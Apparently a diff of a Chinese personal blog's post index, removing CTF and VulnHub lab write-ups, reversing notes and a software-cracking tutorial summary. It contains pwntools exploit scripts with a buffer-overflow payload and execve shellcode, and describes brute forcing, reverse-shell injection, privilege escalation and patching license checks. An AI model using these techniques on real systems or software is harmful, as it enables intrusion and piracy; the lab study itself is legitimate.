-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">sh = remote(&#x27;challenge.basectf.fun&#x27;,31868)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;0&#x27;*(32+8)+p64(0x4011BB)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="Week1-shellcode-level0"><a href="#Week1-shellcode-level0" class="headerlink" title="[Week1] shellcode_level0"></a>[Week1] shellcode_level0</h2><p>用pwntools喵喵工具生成shellcode,直接出<br><img src="/2024/08/18/basectf-week1-wp/pwn_shellcode1.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/pwn_shellcode2.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/pwn_shellcode3.png" alt="alt text"> </p>
-<p>exp如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">sh = process(&#x27;./shellcode_level0&#x27;)</span><br><span class="line">elf = ELF(&#x27;./shellcode_level0&#x27;)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="Week1-我把她丢了"><a href="#Week1-我把她丢了" class="headerlink" title="[Week1] 我把她丢了"></a>[Week1] 我把她丢了</h2><p>栈溢出的残缺后门+nx保护<br>不太懂,上网照喵画虎弄出来的<br><img src="/2024/08/18/basectf-week1-wp/pwn_wbtdl1.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/pwn_wbtdl2.png" alt="alt text"></p>
-<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Week1-You-are-good-at-IDA"><a href="#Week1-You-are-good-at-IDA" class="headerlink" title="[Week1] You are good at IDA"></a><strong>[Week1] You are good at IDA</strong></h2><p>ida拖进去看的三个函数,有flag的三部分,拼起来就好了<br><img src="/2024/08/18/basectf-week1-wp/reverse_ezida3.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/reverse_ezida1.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/reverse_ezida2.png" alt="text"></p>
-<h2 id="Week1-UPX-mini"><a href="#Week1-UPX-mini" class="headerlink" title="[Week1] UPX mini"></a><strong>[Week1] UPX mini</strong></h2><p>用upx妙妙工具解壳,<br>然后就看到了base秘文<br>用cyberchef妙妙工具得flag<br><img src="/2024/08/18/basectf-week1-wp/reverse_upx1.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/reverse_upx2.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/reverse_upx3.png" alt="alt text"></p>
-<h2 id="Week1-ez-maze"><a href="#Week1-ez-maze" class="headerlink" title="[Week1] ez_maze"></a>[Week1] ez_maze</h2><p>迷宫题<br>找到了地图和长宽数据<br><img src="/2024/08/18/basectf-week1-wp/reverse_maze1.png" alt="text"><br><img src="/2024/08/18/basectf-week1-wp/reverse_maze2.png" alt="text"> </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x$$$$$$$$$$$$$$</span><br><span class="line">&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$</span><br><span class="line">&amp;$&amp;$$&amp;$$&amp;&amp;&amp;&amp;&amp;$$</span><br><span class="line">&amp;$&amp;$$$&amp;&amp;$$$$&amp;$$</span><br><span class="line">&amp;$$$&amp;&amp;&amp;$$$$$&amp;$$</span><br><span class="line">&amp;$$$&amp;$&amp;&amp;$&amp;$$$$$</span><br><span class="line">&amp;$$$&amp;$&amp;$$&amp;&amp;&amp;$$$</span><br><span class="line">&amp;&amp;&amp;&amp;&amp;$&amp;&amp;&amp;&amp;$&amp;$$$</span><br><span class="line">$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$</span><br><span class="line">$$$$$$&amp;$$$$$$$$</span><br><span class="line">$$$&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;$$$</span><br><span class="line">$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$</span><br><span class="line">$$$$$$$$$&amp;$$&amp;$$</span><br><span class="line">$$$$$$$$$&amp;$&amp;$$$</span><br><span class="line">$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;y</span><br></pre></td></tr></table></figure>
-
-<p>&amp;是路,$是墙,用最短路线走到y<br><img src="/2024/08/18/basectf-week1-wp/reverse_maze3.png" alt="alt text"><br>然后转md5就是flag了</p>
-<h2 id="Week1-Ez-Xor"><a href="#Week1-Ez-Xor" class="headerlink" title="[Week1] Ez Xor"></a>[Week1] Ez Xor</h2><p>用ida看到如下内容<br><img src="/2024/08/18/basectf-week1-wp/re_ezxor1.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/re_ezxor2.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/re_ezxor3.png" alt="alt text"> </p>
-<p>这段程序通过keystream函数生成了长度为28的key<br>然后通过encrypt函数对用户的输入进行xor运算<br>然后通过checkflag函数将加密后的用户输入和str比较</p>
-<p>由于</p>
-<ol>
-<li>key是固定生成的</li>
-<li>xor的逆运算是再xor一遍<br>所以能够用c将keystream 和 encrypt实现<br>将str作为输入<br>就能得到flag了</li>
-</ol>
-<p>str如下<br><img src="/2024/08/18/basectf-week1-wp/re_ezxor4.png" alt="alt text"> </p>
-<p>exp如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void decrypt(int *v14,int *str,int v17)&#123;</span><br><span class="line">    for (int i=0;i&lt;v17;i++)&#123;</span><br><span class="line">        printf(&quot;%d&quot;, str[i]);</span><br><span class="line">        str[i]=str[i]^v14[v17-i-1];</span><br><span class="line">        printf(&quot;%d %d\n&quot;,str[i], v14[v17-i-1]);</span><br><span class="line">        // printf(&quot;%d&quot;,str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void KeyStream(int *v4,int *v14,int a3)&#123;</span><br><span class="line">    for (int i=0;i&lt;a3;i++)&#123;</span><br><span class="line">        v14[i]=i^v4[i%3];</span><br><span class="line">        // printf(&quot;%c&quot;,v14[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int v4[3]=&#123;&#x27;X&#x27;,&#x27;o&#x27;,&#x27;r&#x27;&#125;;</span><br><span class="line">    int v14[28]=&#123;88,110,112,91,107,119,94,104,122,81,101,121,84,98,124,87,127,99,74,124,102,77,121,101,64,118,104,67&#125;;</span><br><span class="line">    // int v14[28];</span><br><span class="line">    int v5[28];</span><br><span class="line">    int str[28]=&#123;1,9,5,&#x27;%&#x27;,&#x27;&amp;&#x27;,&#x27;-&#x27;,0x0B,0x1D,&#x27;$&#x27;,&#x27;z&#x27;,&#x27;1&#x27;,&#x27; &#x27;,0x1E,&#x27;I&#x27;,&#x27;=&#x27;,&#x27;g&#x27;,&#x27;M&#x27;,&#x27;P&#x27;,8,&#x27;%&#x27;,&#x27;.&#x27;,&#x27;n&#x27;,5,&#x27;4&#x27;,&#x27;\&quot;&#x27;,&#x27;@&#x27;,&#x27;;&#x27;,&#x27;%&#x27;&#125;;</span><br><span class="line">    KeyStream(&amp;v4,v14,28);</span><br><span class="line">    decrypt(v14,str,28);</span><br><span class="line"></span><br><span class="line">    // for(int i=0;i&lt;28;i++)&#123;</span><br><span class="line"></span><br><span class="line">    //     printf(&quot;%d,&quot;, v14[i]);</span><br><span class="line">    // &#125;</span><br><span class="line"></span><br><span class="line">    for(int i=0;i&lt;28;i++)&#123;</span><br><span class="line"></span><br><span class="line">        printf(&quot;%c&quot;, str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Week1-BasePlus"><a href="#Week1-BasePlus" class="headerlink" title="[Week1] BasePlus"></a>[Week1] BasePlus</h2><p>伪代码如下<br><img src="/2024/08/18/basectf-week1-wp/re_base1.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/re_base2.png" alt="alt text"><br><img src="/2024/08/18/basectf-week1-wp/re_base3.png" alt="alt text"></p>
-<p>其加密逻辑大致是</p>
-<ol>
-<li>将用户的输入以3个字符为单位分组,不足的用0作为填充</li>
-<li>加载每个分组,通过<em>二进制运算</em>得到下标,通过secret字典产生4个密文</li>
-<li>最终的密文长度,就是分组数*4</li>
-</ol>
-<p>程序提供了加密后的flag<br>我们可以通过flag的每4个字符,和secret字典比对得到每4个下标</p>
-<p>这4个下标来自于明文的每3个字符</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 一个字符有8bit</span><br><span class="line">(unsigned __int8)v15 &gt;&gt; 2 // 第一个字符的前6个bit</span><br><span class="line">(HIBYTE(v15) &gt;&gt; 4) | (16 * v15) &amp; 0x30 // 第二个字符的前4bit和第一个字符的后2bit</span><br><span class="line">(v16 &gt;&gt; 6) | (4 * HIBYTE(v15)) &amp; 0x3C // 第三个字符的前2个bit和第二哥字符的后4bit</span><br><span class="line">v16 &amp; 0x3F // 第三个字符的后6bit</span><br></pre></td></tr></table></figure>
-<p>总之,我们只要把所有的bit拼回去,就能得到flag</p>
-<p>exp如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag = &quot;lvfzBiZiOw7&lt;lhF8dDOfEbmI]i@bdcZfEc^z&gt;aD!&quot;</span><br><span class="line">secret=&quot;/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC&quot;</span><br><span class="line">flag = list(flag)</span><br><span class="line">for i in range(len(flag)):</span><br><span class="line">    flag[i] = ord(flag[i]) ^ 0xE</span><br><span class="line"></span><br><span class="line">for i in range(0, len(flag),4):</span><br><span class="line">    a1=secret.index(chr(flag[i])) # v15 前6位 为00111111</span><br><span class="line">    a2=secret.index(chr(flag[i+1])) # v16的前4位和v15后2位为00001111和00110000</span><br><span class="line">    a3=secret.index(chr(flag[i+2])) # v16的后4位和v17的前2位00111100 00000011</span><br><span class="line">    a4=secret.index(chr(flag[i+3])) # v17的后6位00111111</span><br><span class="line">    v15_1 = (a2 &amp; 0b00110000)&gt;&gt;4</span><br><span class="line">    v15_2 = a1&lt;&lt; 2</span><br><span class="line">    v15 = v15_1 | v15_2</span><br><span class="line">    v16_1 = (a2 &amp; 0b00001111) &lt;&lt; 4</span><br><span class="line">    v16_2 = (a3&amp;0b00111100) &gt;&gt; 2</span><br><span class="line">    v16=v16_1|v16_2</span><br><span class="line">    v17_1=(a3&amp;0b00000011)&lt;&lt;6</span><br><span class="line">    v17_2=(a4 &amp; 0b00111111)</span><br><span class="line">    v17=v17_1|v17_2</span><br><span class="line"></span><br><span class="line">    print(chr(v15),end=&#x27;&#x27;)</span><br><span class="line">    print(chr(v16),end= &#x27;&#x27;)</span><br><span class="line">    print(chr(v17),end= &#x27;&#x27;)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>writeup - basectf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>逆向之什么是int 80h</title>
-    <url>/2024/08/10/int-80h/</url>
-    <content><![CDATA[<p><a href="https://0xinfection.github.io/reversing/pages/part-22-asm-program-1-moving-immediate-data.html">https://0xinfection.github.io/reversing/pages/part-22-asm-program-1-moving-immediate-data.html</a></p>
-<p>虽然文章给了很多信息,但对某些核心的要点表述太多,还好我有文心一言</p>
-<h1 id="内存空间"><a href="#内存空间" class="headerlink" title="内存空间"></a>内存空间</h1><p>linux系统的内存空间分为:USER SPACE 和 LINUX KERNEL SPACE</p>
-<p>其中,汇编产生的程序,其运行时的内容都在USER SPACE,int 80h在这里出现</p>
-<h1 id="其工作流程是"><a href="#其工作流程是" class="headerlink" title="其工作流程是:"></a>其工作流程是:</h1><ol>
-<li>准备参数:<ol>
-<li><code>%eax</code>寄存器：用于存放系统调用号，即要执行的系统调用的唯一标识符。</li>
-<li><code>%ebx</code>、<code>%ecx</code>、<code>%edx</code>等寄存器：用于按顺序存放系统调用所需的参数。对于需要超过三个参数的系统调用，可能还会使用<code>%esi</code>、<code>%edi</code>和<code>%ebp</code>寄存器，或者在内存中分配空间并通过寄存器传递指向该空间的指针。</li>
-</ol>
-</li>
-<li>保存上下文,例如USERSPACE里的下一条指令,FLAGS和重要的寄存器数据,它们都会推送到栈里</li>
-<li>跳转到中断描述符表（IDT）(或者中断向量符表)的第0x80项:中断服务例程（ISR）(下面有解释👇)</li>
-<li>根据寄存器的内容,执行特定的系统调用</li>
-<li>执行完之后,从内核态转到用户态 这个过程叫IRET</li>
-<li>pop被保存的上下文,即来到int80h下的第一条指令</li>
-</ol>
-<h1 id="中断向量符表"><a href="#中断向量符表" class="headerlink" title="中断向量符表"></a>中断向量符表</h1><p>Interrupt Descriptor Table</p>
-<p>其前身(不确定)Interrupt Vector Table</p>
-<p>在内存的最底部,段地址和偏移地址都为0的地方,存在名为Interrupt Vector Table的数据结构<br>其包含256个条目,每个条目有4bytes,每个条目都是一个内存地址称为中断向量</p>
-<p>其中第0x80项:中断服务例程（ISR）会读取<code>%eax</code>寄存器中的系统调用号，并根据该号码查找并调用相应的系统调用处理函数</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>int 80h是进行系统调用的方法</p>
-]]></content>
-      <categories>
-        <category>操作系统</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>how-to-correct-grammar-effectively</title>
-    <url>/2024/08/05/how-to-correct-grammar-effectively/</url>
-    <content><![CDATA[<p><a href="https://www.youtube.com/watch?v=A5uz6LWeLPM">https://www.youtube.com/watch?v=A5uz6LWeLPM</a></p>
-<p>磨听力时看到的视频,讲了如何学习英语语法并有效寻找纠正语法错误的方法</p>
-<p>这分为一下几个步骤:</p>
-<ol>
-<li>找出语法错误和弱项</li>
-<li>确认问题属于:form or function  (用法错误还是压根不认识不会用)</li>
-<li>制作template 把句型提取出来 用n种方式补全 (I haven’t ··· yet today )</li>
-</ol>
-<p>关于步骤一,平时没有积累,不知道弱项怎么办的?<br>网上找篇文章,读个2-3遍,用自己的英语写一遍,丢给AI</p>
-]]></content>
-      <categories>
-        <category>英语</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>wanwan破解-心得</title>
-    <url>/2024/08/04/wanwan%E7%A0%B4%E8%A7%A3/</url>
-    <content><![CDATA[<p>这是吾爱破解上的软件破解入门教程, <a href="https://www.52pojie.cn/thread-1358649-1-1.html">https://www.52pojie.cn/thread-1358649-1-1.html</a><br>浅尝辄止了一下,记录一点小小的收获</p>
-<p>软件破解是逆向工程的一个分支,是绕过软件创作者的使用限制的技术<br>要破解的有两个方面:</p>
-<ol>
-<li>注册验证</li>
-<li>反调试</li>
-</ol>
-<h1 id="注册验证"><a href="#注册验证" class="headerlink" title="注册验证"></a>注册验证</h1><p>也就是向软件证明自己的身份,来告诉创作者:我是付过钱的</p>
-<p>验证方法有:本地验证和网络验证<br>本地验证又有:</p>
-<ol>
-<li>重启验证:注册不过期,例如使用注册码后,软件在注册表创建“已注册”的标志,每次软件打开都会先读取一次注册表</li>
-<li>非重启验证:注册会过期,例如账号密码验证,每次重启软件都要重新输入账号密码</li>
-</ol>
-<p>这套教程只讲解本地验证的破解方法</p>
-<h1 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h1><p>其手段大致四类:</p>
-<ol>
-<li>通过环境查看手段,判断是否有调试器打开,例如看进程</li>
-<li>对用户正在使用调试器的行为进行动态识别,是不是正在用调试器对软件进行调试和修改</li>
-<li>对软件完整性进行检测,例如把加壳后的软件解壳,软件的体积和内容发生更改后,会被检测到</li>
-<li>干扰处理:就是让你看不懂,加壳、加花、虚拟化代码</li>
-</ol>
-<h1 id="如何破解"><a href="#如何破解" class="headerlink" title="如何破解?"></a>如何破解?</h1><p>用反汇编器和调试器下断点,找关键代码,并进行适当的修改——打补丁<br>常用的工具例如ida和ollydbg<br>然后,要用吾爱破解专用ollydbg,因为有插件</p>
-<h2 id="怎么下断点"><a href="#怎么下断点" class="headerlink" title="怎么下断点?"></a>怎么下断点?</h2><ol>
-<li>关键字<br>软件的内容分为指令和数据,在指令和数据区搜索“登录失败”之类的关键词就能锁定关键代码的位置</li>
-<li>api<br>通常软件的弹窗、按钮等的功能都是对系统api的调用,而不是软件开发者花时间自己的写的<br>搜索对应的api,下断点<br>动态调试这个软件<br>就能找打关键指令的位置</li>
-</ol>
-<h2 id="找到关键指令了-下一步-打补丁"><a href="#找到关键指令了-下一步-打补丁" class="headerlink" title="找到关键指令了,下一步?打补丁"></a>找到关键指令了,下一步?打补丁</h2><p>阅读它,你需要能看懂汇编代码,你需要了解寄存器,你需要着重学习push、pop、call、ret、jmp和各种变体指令,如果你能懂call stack就更好了<br>PS: call stack 这个wanwan破解并没有教,如果你感兴趣,你可以穿越到几个月前访问begin.re学习这个知识,它下架了:(</p>
-<p>假如这是个要本地登录的软件<br>你可能看指令的时候,看到“登录成功”和“登录失败”的弹窗指令,它们挨的很近<br>你只需要找到附近的je指令(也可能是jle或jge)改成jmp,跳过“登录失败”的弹窗指令,来到“登录成功”的指令</p>
-<p>这会导致什么结果呢?你怎么登录都会显示“登录成功”,因为你无法“登录失败”</p>
-<h1 id="总之"><a href="#总之" class="headerlink" title="总之"></a>总之</h1><p>破解的流程是:<br>找关键代码》分析〉跳过失败的指令》破解成功</p>
-<p>我不太想在软件破解上更进一步,卖破解软件是要吃牢饭的</p>
-]]></content>
-      <categories>
-        <category>逆向工程</category>
-        <category>软件破解</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>gigachad:1-writeup</title>
-    <url>/2024/03/09/old/gigachad-1-writeup/</url>
-    <content><![CDATA[<p>靶机地址:<a href="https://www.vulnhub.com/entry/gigachad-1,657/">https://www.vulnhub.com/entry/gigachad-1,657/</a></p>
-<h1 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h1><ol>
-<li>开启的ftp服务是能匿名登录的</li>
-<li>根据ftp里那个的提示，了解了一个username，可以从web上获取一张藏有密码提示的图片</li>
-<li>图片里没有用到隐写，应该去google上搜图</li>
-<li>find可以找到，靶机里有个s-nail-privsec的SUID文件，在exploitdb上找相关的exp就能提权</li>
-</ol>
-<p>文章讲解：<br><a href="https://nepcodex.com/2021/07/gigachad-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/07/gigachad-walkthrough-vulnhub-writeup/</a><br><a href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-5899">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-5899</a></p>
-<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="/2024/03/09/old/gigachad-1-writeup/drippinchad.png"><br><img src="/2024/03/09/old/gigachad-1-writeup/flag.png"><br><img src="/2024/03/09/old/gigachad-1-writeup/chad_real_identity.png"></p>
-<h1 id="有趣的东西"><a href="#有趣的东西" class="headerlink" title="有趣的东西"></a>有趣的东西</h1><h2 id="the-real-gigachad"><a href="#the-real-gigachad" class="headerlink" title="the real gigachad"></a>the real gigachad</h2><p>关于靶机根目录里留下的图片，可以获取一下信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">演员的维基介绍 https://tr.wikipedia.org/wiki/Sefa_Zengin</span><br><span class="line"></span><br><span class="line">2003-2004 - Kurtlar Vadisi - Erdal Kömürcü</span><br><span class="line"></span><br><span class="line">土耳其惡狼谷 英文名:Valley of the Wolves 土耳其名:Kurtlar Vadisi</span><br><span class="line">Erdal Kömürcü是该系列的一名角色</span><br></pre></td></tr></table></figure>
-<p>大多数是土耳其语，并且目前的翻译软件比较垃圾，又懒得看，就只能给出这点东西了</p>
-<h2 id="rabbit-hole"><a href="#rabbit-hole" class="headerlink" title="rabbit hole"></a>rabbit hole</h2><p>dirsearch 扫描web的时候会冒出来一堆莫名其妙的东西，我也不知道这个叫什么，在 <a href="https://nepcodex.com/2021/07/gigachad-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/07/gigachad-walkthrough-vulnhub-writeup/</a> 里被叫做兔子洞，但我直接搜会搜到别的东西</p>
-<p><a href="https://rabbithole.gg/">https://rabbithole.gg/</a><br>web3，学不会一点（−＿−；）</p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>javadoc</title>
-    <url>/2024/01/30/old/javadoc/</url>
-    <content><![CDATA[<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 文档注释</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
-
-<p>运行命令，生成文档注释对应的技术文档</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javadoc 文件名 -d 指定目录</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>java</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dc-2-writeup</title>
-    <url>/2023/12/24/old/dc-2-writeup/</url>
-    <content><![CDATA[<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote>
-<p>靶机链接： <a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>靶机链接： <a href="http://www.five86.com/dc-2.html">http://www.five86.com/dc-2.html</a><br>系列：- <a href="https://www.vulnhub.com/series/dc,199/">DC</a></p>
-</blockquote>
-<p><img src="/2023/12/24/old/dc-2-writeup/-"></p>
-<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ol>
-<li>绑定ip和域名</li>
-<li>通过wpscan获取用户名，并用cewl获取密码，制作成两个字典</li>
-<li>msf爆破，得到两个账户</li>
-<li>通过其中一个账户，得到shell</li>
-</ol>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
-<li>绕过rbash</li>
-<li>尝试切换另一个账户，成功</li>
-<li>sudo -l发现git的委派权限</li>
-<li>git提权</li>
-</ol>
-<h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote>
-<p>cewl通过爬虫生成字典<br>rbash绕过</p>
-</blockquote>
-<h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><p>查看网络<br><img src="/2023/12/24/old/dc-2-writeup/10%E7%BD%91%E7%BB%9C.png"><br>绑定域名和ip<br><img src="/2023/12/24/old/dc-2-writeup/11.png"><br>第一个flag<br><img src="/2023/12/24/old/dc-2-writeup/12flag1.png"><br>制作网站登录爆破字典，爆出账户密码<br><img src="/2023/12/24/old/dc-2-writeup/13user.png"><br><img src="/2023/12/24/old/dc-2-writeup/14password.png"><br><img src="/2023/12/24/old/dc-2-writeup/15brute.png"><br><img src="/2023/12/24/old/dc-2-writeup/16flag2.png"><br>拿shell<br><img src="/2023/12/24/old/dc-2-writeup/17getshell.png"><br>提权<br><img src="/2023/12/24/old/dc-2-writeup/18%E8%83%BD%E6%89%A7%E8%A1%8C%E7%9A%84%E5%91%BD%E4%BB%A4.png"><br><img src="/2023/12/24/old/dc-2-writeup/19flag4.png"><br><img src="/2023/12/24/old/dc-2-writeup/20%E6%9F%A5%E7%9C%8B%E6%9D%83%E9%99%90.png"><br><img src="/2023/12/24/old/dc-2-writeup/21root.png"><br><img src="/2023/12/24/old/dc-2-writeup/22finalflag.png"></p>
-<h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><p>在打DC-2的时候，在最后的提权阶段，感受到了急躁<br>首先就是，在得到了flag2，得到了两个用户和密码的时候，没有去试ssh，而是先去看了writeup<br>然后就是里面cd命令回显rbash的时候，没有首先去搜rbash，而是去看了一眼writeup<br>最后就是，绕过rbash之后，也没有尝试使用su进行用户切换，而是去看了一眼writeup<br>受不了了</p>
-<ol>
-<li>不要放过任何的回显</li>
-<li>尝试每一个账户，在可登录的任何地方</li>
-<li>每每感受到了障碍，就明晰进入下一步可能可以做什么？需要什么信息？当前有什么信息？可以用信息来干嘛？</li>
-</ol>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
-<p><a href="https://gtfobins.github.io/gtfobins/git/#sudo">https://gtfobins.github.io/gtfobins/git/#sudo</a> 提权<br><a href="https://cloud.tencent.com/developer/article/1720937">https://cloud.tencent.com/developer/article/1720937</a> 修改环境变量中的PATH<br><a href="https://www.freebuf.com/articles/system/188989.html">https://www.freebuf.com/articles/system/188989.html</a> rbash绕过</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hello-World-powered-by-Java</title>
     <url>/2023/12/21/old/Hello-World-powered-by-Java/</url>
     <content><![CDATA[<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		<span class="comment">// 生成一些简单的输出</span></span><br><span class="line">		System.out.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -422,366 +38,6 @@
 ]]></content>
       <categories>
         <category>java</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ted:1 writeup</title>
-    <url>/2023/12/17/old/Ted-1-writeup/</url>
-    <content><![CDATA[<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote>
-<p>靶机链接： <a href="https://www.vulnhub.com/entry/ted-1,327/">https://www.vulnhub.com/entry/ted-1,327/</a></p>
-</blockquote>
-<span id="more"></span>
-<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><h2 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h2><ol>
-<li>http进去时登录验证界面</li>
-<li>用户名密码都好猜的要死，但是密码正确后要提示转成hash，使出来时sha256:英文字母大写</li>
-<li>进去后是一个文件包含的页面</li>
-<li>通过session注入的方式注入一句话反弹shell，然后再包含，得到shell</li>
-<li>session注入方式，是注入user_pref键，注入内容需全部转成urlencode形式</li>
-</ol>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
-<li>sudo -l 发现能以root权限无密码执行apt-get命令，以此提权</li>
-</ol>
-<h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote>
-<p><a href="https://tool.oschina.net/encrypt?type=2">https://tool.oschina.net/encrypt?type=2</a> hash加密<br><a href="https://www.iamwawa.cn/daxiaoxie.html">https://www.iamwawa.cn/daxiaoxie.html</a> 英文大小写转换</p>
-</blockquote>
-<h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><p>网络<br><img src="/2023/12/17/old/Ted-1-writeup/1%E7%BD%91%E7%BB%9C.png"><br>查看web页面<br><img src="/2023/12/17/old/Ted-1-writeup/11%E4%B8%BB%E9%A1%B5.png"><br><img src="/2023/12/17/old/Ted-1-writeup/12%E8%AE%A4%E8%AF%81%E9%A1%B5%E9%9D%A2.png"><br>制作字典并爆破<br><img src="/2023/12/17/old/Ted-1-writeup/13%E5%AD%97%E5%85%B8.png"><br><img src="/2023/12/17/old/Ted-1-writeup/14.png"><br><img src="/2023/12/17/old/Ted-1-writeup/15.png"><br><img src="/2023/12/17/old/Ted-1-writeup/16%E6%88%90%E5%8A%9F.png"><br>撕开口子拿shell<br><img src="/2023/12/17/old/Ted-1-writeup/17session%E6%B3%A8%E5%85%A5.png"><br><img src="/2023/12/17/old/Ted-1-writeup/18fantanshell%E8%AF%AD%E5%8F%A5.png"><br><img src="/2023/12/17/old/Ted-1-writeup/19%E6%8B%BF%E5%88%B0shell.png"><br>提权<br><img src="/2023/12/17/old/Ted-1-writeup/20%E6%8F%90%E6%9D%83.png"></p>
-<h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol>
-<li>靶机真短</li>
-<li>不过session注入是一个非常好的思路</li>
-<li>user_pref什么的，还有sudo-l只执行apt-get太刻意了</li>
-</ol>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
